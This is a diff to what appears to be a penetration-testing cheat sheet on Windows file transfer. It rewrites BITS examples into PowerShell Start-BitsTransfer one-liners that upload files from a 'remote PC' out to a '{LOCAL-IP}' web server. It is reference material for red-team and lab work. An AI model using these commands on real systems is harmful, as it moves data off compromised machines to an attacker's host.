@@ -111,21 +111,17 @@ USING WinRM -
 USING BITSADMIN - 
 ------------------------------------------------------------------------------------------------------------------
 
-**Web Content Upload**
+**Upload a single file from Remote PC to Local PC**
     
-    Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://{LCOAL-IP}/demo.txt" -TransferType Upload
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source '\users\public\demo.txt' -Destination 'http://{LOCAL-IP}/demo.txt' -TransferType Upload"
 
-**Web Content Upload**
+**Upload multiple files from Remote PC to Local PC**
     
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://{LOCAL-IP}/demo.txt" -TransferType Upload
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'c:\users\public\demo1.txt', 'c:\users\public\demo2.txt' -Destination 'http://{LOCAL-IP}/demo1.txt', 'http://{LOCAL-IP}/demo2.txt' -TransferType Upload"
 
-**Web Content Upload**
+**Upload a single file to a Windows directory to another directory:**
     
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination 'c:\temp\demo.txt'"
-
-**Web Content Upload**
-    
-    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://{LOCAL-IP}/demo.txt' -Destination 'c:\temp\demo.txt' -Method 'PUT'"
+    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source '\users\public\demo.txt' -Destination '\users\public\' -TransferType Upload"
 ------------------------------------------------------------------------------------------------------------------
 
 </br>
